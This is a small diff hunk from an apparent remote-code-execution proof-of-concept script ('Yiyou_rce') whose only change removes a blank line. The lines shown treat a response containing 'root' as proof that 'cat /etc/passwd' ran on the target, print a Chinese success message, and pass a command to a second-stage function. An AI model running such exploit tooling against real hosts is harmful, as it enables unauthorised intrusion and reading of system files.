@@ -25,7 +25,6 @@ def Yiyou_rce(Url):
         if "root" in response.text and response.status_code == 200:
             print("\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \033[0m".format(urldata))
             # print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
-            
             POC_2(urldata, cmd)
         else:
             print("\033[31m[x] 请求失败 \033[0m")
